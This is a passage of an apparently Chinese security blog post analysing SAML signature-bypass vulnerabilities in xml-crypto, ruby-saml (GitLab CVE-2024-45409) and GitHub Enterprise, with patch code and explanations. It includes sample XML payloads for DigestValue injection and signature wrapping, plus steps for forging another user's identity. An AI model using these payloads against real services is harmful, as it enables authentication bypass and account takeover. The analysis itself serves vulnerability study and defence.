+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Reset the references as only references from our re-parsed signedInfo node can be trusted</span></span><br><span class="line">     <span class="variable language_">this</span>.<span class="property">references</span> = [];</span><br><span class="line"> </span><br><span class="line">     <span class="keyword">const</span> unverifiedSignedInfoCanon = <span class="variable language_">this</span>.<span class="title function_">getCanonSignedInfoXml</span>(doc);</span><br><span class="line">     <span class="keyword">if</span> (!unverifiedSignedInfoCanon) &#123;</span><br><span class="line">       <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;Canonical signed info cannot be empty&quot;</span>);</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="comment">// unsigned, verify later to keep with consistent callback behavior</span></span><br><span class="line">     <span class="keyword">const</span> parsedUnverifiedSignedInfo = <span class="keyword">new</span> xmldom.<span class="title class_">DOMParser</span>().<span class="title function_">parseFromString</span>(</span><br><span class="line">       unverifiedSignedInfoCanon,</span><br><span class="line">       <span class="string">&quot;text/xml&quot;</span>,</span><br><span class="line">     );</span><br><span class="line"> </span><br><span class="line">     <span class="keyword">const</span> unverifiedSignedInfoDoc = parsedUnverifiedSignedInfo.<span class="property">documentElement</span>;</span><br><span class="line">     <span class="keyword">if</span> (!unverifiedSignedInfoDoc) &#123;</span><br><span class="line">       <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;Could not parse unverifiedSignedInfoCanon into a document&quot;</span>);</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="keyword">const</span> references = utils.<span class="title function_">findChildren</span>(unverifiedSignedInfoDoc, <span class="string">&quot;Reference&quot;</span>);</span><br><span class="line">     <span class="keyword">if</span> (!utils.<span class="title function_">isArrayHasLength</span>(references)) &#123;</span><br><span class="line">       <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;could not find any Reference elements&quot;</span>);</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="comment">// <span class="doctag">TODO:</span> In a future release we&#x27;d like to load the Signature and its References at the same time,</span></span><br><span class="line">     <span class="comment">// however, in the `.loadSignature()` method we don&#x27;t have the entire document,</span></span><br><span class="line">     <span class="comment">// which we need to to keep the inclusive namespaces</span></span><br><span class="line">     <span class="keyword">for</span> (<span class="keyword">const</span> reference <span class="keyword">of</span> references) &#123;</span><br><span class="line">       <span class="variable language_">this</span>.<span class="title function_">loadReference</span>(reference);</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>
+<p>并且获取 reference 也不再使用 xpath，也就不存在上面说的 xpath 选择器的问题了，并且在 getCanonSignedInfoXml 方法里面还有额外的判断：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (signedInfo.<span class="property">length</span> &gt; <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(</span><br><span class="line">        <span class="string">&quot;could not get canonicalized signed info for a signature that contains multiple SignedInfo nodes&quot;</span>,</span><br><span class="line">      );</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>总之通过在 checkSignature 函数重新进行规范化处理然后取值，避免了两次验签过程拿到的值不一致，解决了两个问题。</p>
+<h2 id="gitlab-CVE-2024-45409"><a href="#gitlab-CVE-2024-45409" class="headerlink" title="gitlab-CVE-2024-45409"></a>gitlab-CVE-2024-45409</h2><p>从漏洞通告来看，涉及两个库：ruby-saml 和 omniauth-saml，但是看 omniauth-saml 的说明和修改，只是把 ruby-saml 的版本升级了，所以这里出问题还是在 ruby-saml 库，先来看一下修补：</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">encoded_digest_value = <span class="variable constant_">REXML</span><span class="symbol">:</span><span class="symbol">:XPath</span>.first(</span><br><span class="line">         ref,</span><br><span class="line">       - <span class="string">&quot;//ds:DigestValue&quot;</span>,</span><br><span class="line">       + <span class="string">&quot;./ds:DigestValue&quot;</span>,</span><br><span class="line">         &#123; <span class="string">&quot;ds&quot;</span> =&gt; <span class="variable constant_">DSIG</span> &#125;</span><br><span class="line">       )</span><br></pre></td></tr></table></figure>
+<p>也就是将 <code>//ds:DigestValue</code> 变成了 <code>./ds:DigestValue</code>。一开始看到这里可能觉得没有什么问题，以为 REXML::XPath.first 方法会从 ref 节点去取，至于 <code>//</code> 限定符也只是限定所有 ref 的子节点，但是从漏洞利用来看，并不是这样，实际上和 ref 没啥关系，搭建一个简单的 demo 验证了也确实如此，所以这里的 ref 难道不起作用？不过先不管了，先还是根据这个现象继续推进。实际上会获取所有 DigestValue，并且从上到下顺序。</p>
+<p>这里涉及了 xpath，先来看几个 xpath 的使用：</p>
+<ul>
+<li>&#x2F;   ：跟节点开始</li>
+<li>.&#x2F;  ：从当前节点开始</li>
+<li>&#x2F;&#x2F;  ：任意节点</li>
+</ul>
+<p>那么就很简单了，就是 xpath 选择器的问题，只要能添加一个伪造的 DigestValue 就可以了，结合上面分析 29774 时候的知识，这个值会用来和后面 nokogiri 算出来的值作比较，nokogiri 是取的整个文档运算，也就是说两个我们都可控，可以随意修改成其他账号，只需要根据修改后的值算出来这个 DigestValue，然后填进去，pd 的作者使用的是 <code>samlp:Extensions</code> 节点：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">samlp:Extensions</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">DigestValue</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/09/xmldsig#&quot;</span>&gt;</span></span><br><span class="line">    	legitdigestvalue</span><br><span class="line">    <span class="tag">&lt;/<span class="name">DigestValue</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">samlp:Extensions</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>至于这个 Extensions 节点会不会影响 DigestValue 的计算呢？从 pd 给的 poc 来看，reference 指向的 uri 是 Assertion 节点，而不是整个 response 标签。结构如下(为了美观，简化了结构)：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">samlp:Response</span> <span class="attr">ID</span>=<span class="string">&quot;_afe0ff5379c42c67e0fb&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">samlp:Extensions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">DigestValue</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/09/xmldsig#&quot;</span>&gt;</span></span><br><span class="line">            legitdigestvalue</span><br><span class="line">        <span class="tag">&lt;/<span class="name">DigestValue</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">samlp:Extensions</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">saml:Assertion</span> <span class="attr">ID</span>=<span class="string">&quot;_911d8da24301c447b649&quot;</span> &gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Signature</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/09/xmldsig#&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">SignedInfo</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">Reference</span> <span class="attr">URI</span>=<span class="string">&quot;#_911d8da24301c447b649&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">DigestValue</span>&gt;</span>U31P2Bs1niIjPrSSA5hpC0GN4EZvsWMiOrHh6TqQFqM=<span class="tag">&lt;/<span class="name">DigestValue</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">Reference</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">SignedInfo</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Signature</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">saml:Assertion</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">samlp:Response</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>所以 Extensions 节点并不会参与计算，可以随便赋值。</p>
+<h2 id="GitHub-CVE-2024-4985-CVE-2024-9487"><a href="#GitHub-CVE-2024-4985-CVE-2024-9487" class="headerlink" title="GitHub-(CVE-2024-4985&amp;CVE-2024-9487)"></a>GitHub-(CVE-2024-4985&amp;CVE-2024-9487)</h2><p>CVE-2024-9487 是对 CVE-2024-4985 的补充修复，pd 这篇应该是对 CVE-2024-9487 的分析。由于暂时搞不到源码，所以无从得知。下面根据 pd 对原本 saml 处理代码进行修改但不改变原始逻辑后的代码进行漏洞分析。</p>
+<p>先来看一下整体调用逻辑，从 from_param 方法开始：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from_param</span><br><span class="line">- build</span><br><span class="line">  - decrypt</span><br><span class="line">    - parse</span><br><span class="line">- valid</span><br><span class="line">  - vaidate_schema</span><br><span class="line">  - validate</span><br><span class="line">    - validate_has_signature</span><br><span class="line">      - has_root_sig_and_matching_ref?</span><br><span class="line">      - OR // you need to return true in one</span><br><span class="line">      - all_assertions_signed_with_matching_ref?</span><br><span class="line">    - validate_assertion_digest_values</span><br><span class="line">    - validate_signatures_ghes</span><br><span class="line">      - signatures.all? &#123; |signature| signature.valid?(certificate) &#125;</span><br></pre></td></tr></table></figure>
+
+<p>先来定义两个词，response-signature 和 assertion-signature，前者是针对整个 response 文档，后者只针对每个对应的 assertion。通过 reference 指向实现。</p>
+<p>看一下处理的逻辑，从 build 方法开始：</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">self</span>.build(xml, options = &#123;&#125;)</span><br><span class="line">  <span class="keyword">if</span> <span class="title class_">GitHub</span>.enterprise? &amp;&amp; <span class="title class_">GitHub</span>.saml_encrypted_assertions?</span><br><span class="line">    signatures = message_class.signatures(doc) <span class="comment"># [1]</span></span><br><span class="line">    decrypt_errors = []</span><br><span class="line">    plain_doc = message_class.decrypt(doc, options, decrypt_errors)</span><br><span class="line">    signatures = message_class.signatures(plain_doc) <span class="keyword">if</span> signatures.empty? <span class="comment"># [2]</span></span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+<p>当存在 encrypted-assertion 时，且 response 包含一个 response-signature 标签时，build 方法会返回这个 response-signature 标签，并且解密 encrypted-assertion 得到一个 plain-assertion，将整个解密后的 response 返回到下一步的 valid 方法，可以理解返回两个值，一个是 response-signature，另一个是得到的 plain-assertion。</p>
+<p>valid 方法第一步是校验 schema，这一步不理，直接到下面的 validate。</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Validate that the SAML message (root XML element of SAML response)</span></span><br><span class="line"><span class="comment"># or all contained assertions are signed</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Verification of signatures is done in #validate_signatures</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">validate_has_signature</span></span><br><span class="line">  <span class="comment"># Return early if entire response is signed. This prevents individual</span></span><br><span class="line">  <span class="comment"># assertions from being tampered because any change in the response</span></span><br><span class="line">  <span class="comment"># would invalidate the entire response.</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">if</span> has_root_sig_and_matching_ref?</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">if</span> all_assertions_signed_with_matching_ref?</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">self</span>.errors &lt;&lt; <span class="string">&quot;SAML Response is not signed or has been modified.&quot;</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">has_root_sig_and_matching_ref?</span></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span> <span class="keyword">if</span> <span class="variable constant_">SAML</span>.mocked[<span class="symbol">:mock_root_sig</span>]</span><br><span class="line">  root_ref = document.at(<span class="string">&quot;/saml2p:Response/ds:Signature/ds:SignedInfo/ds:Reference&quot;</span>, namespaces)</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span> <span class="keyword">unless</span> root_ref</span><br><span class="line">  root_ref_uri = <span class="title class_">String</span>(<span class="title class_">String</span>(root_ref[<span class="string">&quot;URI&quot;</span>])[<span class="number">1</span>..-<span class="number">1</span>]) <span class="comment"># chop off leading #</span></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span> <span class="keyword">unless</span> root_ref_uri.length &gt; <span class="number">1</span></span><br><span class="line">  root_rep = document.at(<span class="string">&quot;/saml2p:Response&quot;</span>, namespaces)</span><br><span class="line">  root_id = <span class="title class_">String</span>(root_rep[<span class="string">&quot;ID&quot;</span>])</span><br><span class="line"></span><br><span class="line">  <span class="comment"># and finally does the root ref URI match the root ID?</span></span><br><span class="line">  root_ref_uri == root_id</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">all_assertions_signed_with_matching_ref?</span></span><br><span class="line">  assertions = document.xpath(<span class="string">&quot;//saml2:Assertion&quot;</span>, namespaces)</span><br><span class="line">  assertions.all? <span class="keyword">do</span> |<span class="params">assertion</span>|</span><br><span class="line">    ref = assertion.at(<span class="string">&quot;./ds:Signature/ds:SignedInfo/ds:Reference&quot;</span>, namespaces)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span> <span class="keyword">unless</span> ref</span><br><span class="line">    assertion_id = <span class="title class_">String</span>(assertion[<span class="string">&quot;ID&quot;</span>])</span><br><span class="line">    ref_uri = <span class="title class_">String</span>(<span class="title class_">String</span>(ref[<span class="string">&quot;URI&quot;</span>])[<span class="number">1</span>..-<span class="number">1</span>]) <span class="comment"># chop off leading #</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span> <span class="keyword">unless</span> ref_uri.length &gt; <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    ref_uri == assertion_id</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+<p>validate 方法第一步使用 validate_has_signature 方法检查是否存在合法的签名，这一步是对上面得到的 plain-assertion 进行的，检查分两步，第一步是检查是否存在匹配的 response-signature 签名，如果不存在，会检查每个 assertion 的 assertion-signature 是否匹配，以防止签名交换攻击。</p>
+<p>第二步是对上面获取到的匹配的 signature 进行 digestvalue 的校验，可以是 response-signature 或者 assertion-signature。</p>
+<p>第三步是对 build 方法返回的 response-signature 签名进行验签。根据获取到的 reference-uri 从整个文档找第一个符合的值，先进行 digestvalue<br>校验，然后对 SignedInfo 进行验签 SignatureValue。</p>
+<p>回顾对 saml 攻击，关键点在于 signature 验签和 digest 摘要不匹配，这里如何实现呢？可以看到实际验签取到的是 build 方法返回值，而验证 digest 的是 validate 方法，validate 方法是对整个 plain-assertion 处理，如果存在加密断言，第一步 build 返回是 response-signature，再验证 digest 时可以是 assertion-signature，关键点在于 validate_has_signature，这一步需要 response-signature 不匹配，自然而然就走到了 assertion-signature。而要 response-signature 不匹配很简单，更改 response 的 id 就行了，这样 response-signature 的 reference 不匹配 response。</p>
+<p>最后一步验签也很重要，要让签名通过，就需要原始的 response 被包含在整个 new-response 里面，这里 pd 使用了 object 标签，这是 signature 标签的一个扩展标签，是可选标签，且不参与签名计算。</p>
+<p>下面是攻击样例：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Response</span> <span class="attr">ID</span>=<span class="string">&quot;11111111&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Signature</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">SignedInfo</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Refernce</span> <span class="attr">URI</span>=<span class="string">&quot;#123&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">Refernce</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">SignedInfo</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Object</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Response</span> <span class="attr">ID</span>=<span class="string">&quot;123&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Signature</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">SignedInfo</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Refernce</span> <span class="attr">URI</span>=<span class="string">&quot;#123&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">Refernce</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">SignedInfo</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Signature</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Assertion</span> <span class="attr">ID</span>=<span class="string">&quot;789&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">Signature</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">SignedInfo</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">Refernce</span> <span class="attr">URI</span>=<span class="string">&quot;#789&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">Refernce</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">SignedInfo</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">Signature</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Assertion</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">Response</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Object</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">Signature</span>&gt;</span></span><br><span class="line">---- THIS WILL BE ENCRYPTED ----</span><br><span class="line">  <span class="tag">&lt;<span class="name">Assertion</span> <span class="attr">ID</span>=<span class="string">&quot;789&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Signature</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;<span class="name">SignedInfo</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Refernce</span> <span class="attr">URI</span>=<span class="string">&quot;#789&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">Refernce</span>&gt;</span> </span><br><span class="line">      <span class="tag">&lt;/<span class="name">SignedInfo</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Signature</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">Assertion</span>&gt;</span></span><br><span class="line">---- THIS WILL BE ENCRYPTED ----</span><br><span class="line"><span class="tag">&lt;/<span class="name">Response</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>断言里面填上想要伪造的身份信息，然后计算 digestvalue，再进行加密，object 标签里面把原来完整的 response 复制进去，修改第一行的 response id 为任意值就行了。</p>
+<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://workos.com/blog/samlstorm">https://workos.com/blog/samlstorm</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/node-saml/xml-crypto/security/advisories/GHSA-x3m8-899r-f7c3">https://github.com/node-saml/xml-crypto/security/advisories/GHSA-x3m8-899r-f7c3</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/node-saml/xml-crypto/security/advisories/GHSA-9p8x-f768-wp2g">https://github.com/node-saml/xml-crypto/security/advisories/GHSA-9p8x-f768-wp2g</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/node-saml/xml-crypto/commit/8ac6118ee7978b46aa56b82cbcaa5fca58c93a07">https://github.com/node-saml/xml-crypto/commit/8ac6118ee7978b46aa56b82cbcaa5fca58c93a07</a></li>
+<li><a target="_blank" rel="noopener" href="https://about.gitlab.com/releases/2024/09/17/patch-release-gitlab-17-3-3-released/">https://about.gitlab.com/releases/2024/09/17/patch-release-gitlab-17-3-3-released/</a></li>
+<li><a target="_blank" rel="noopener" href="https://projectdiscovery.io/blog/ruby-saml-gitlab-auth-bypass">https://projectdiscovery.io/blog/ruby-saml-gitlab-auth-bypass</a></li>
+<li><a target="_blank" rel="noopener" href="https://projectdiscovery.io/blog/github-enterprise-saml-authentication-bypass">https://projectdiscovery.io/blog/github-enterprise-saml-authentication-bypass</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/advisories/GHSA-5pw9-f9r4-mv2r">https://github.com/advisories/GHSA-5pw9-f9r4-mv2r</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/advisories/GHSA-g83h-4727-5rpv">https://github.com/advisories/GHSA-g83h-4727-5rpv</a></li>
+</ul>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/me">About</a></li>
+        
+          <li><a href="/archives/">Archive</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%83%8C%E6%99%AF"><span class="toc-number">1.</span> <span class="toc-text">背景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#saml-%E8%AE%A4%E8%AF%81"><span class="toc-number">2.</span> <span class="toc-text">saml 认证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xml-crypto-CVE-2025-29775-CVE-2025-29774"><span class="toc-number">3.</span> <span class="toc-text">xml-crypto-(CVE-2025-29775 &amp; CVE-2025-29774)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gitlab-CVE-2024-45409"><span class="toc-number">4.</span> <span class="toc-text">gitlab-CVE-2024-45409</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GitHub-CVE-2024-4985-CVE-2024-9487"><span class="toc-number">5.</span> <span class="toc-text">GitHub-(CVE-2024-4985&amp;CVE-2024-9487)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#reference"><span class="toc-number">6.</span> <span class="toc-text">reference</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/04/24/%E7%8E%B0%E4%BB%A3-saml-%E6%94%BB%E5%87%BB-1/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/04/24/%E7%8E%B0%E4%BB%A3-saml-%E6%94%BB%E5%87%BB-1/&text=现代 saml 攻击(1)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/04/24/%E7%8E%B0%E4%BB%A3-saml-%E6%94%BB%E5%87%BB-1/&title=现代 saml 攻击(1)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/04/24/%E7%8E%B0%E4%BB%A3-saml-%E6%94%BB%E5%87%BB-1/&is_video=false&description=现代 saml 攻击(1)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=现代 saml 攻击(1)&body=Check out this article: http://example.com/2025/04/24/%E7%8E%B0%E4%BB%A3-saml-%E6%94%BB%E5%87%BB-1/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/04/24/%E7%8E%B0%E4%BB%A3-saml-%E6%94%BB%E5%87%BB-1/&title=现代 saml 攻击(1)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/04/24/%E7%8E%B0%E4%BB%A3-saml-%E6%94%BB%E5%87%BB-1/&title=现代 saml 攻击(1)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/04/24/%E7%8E%B0%E4%BB%A3-saml-%E6%94%BB%E5%87%BB-1/&title=现代 saml 攻击(1)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/04/24/%E7%8E%B0%E4%BB%A3-saml-%E6%94%BB%E5%87%BB-1/&title=现代 saml 攻击(1)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/04/24/%E7%8E%B0%E4%BB%A3-saml-%E6%94%BB%E5%87%BB-1/&name=现代 saml 攻击(1)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/04/24/%E7%8E%B0%E4%BB%A3-saml-%E6%94%BB%E5%87%BB-1/&t=现代 saml 攻击(1)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
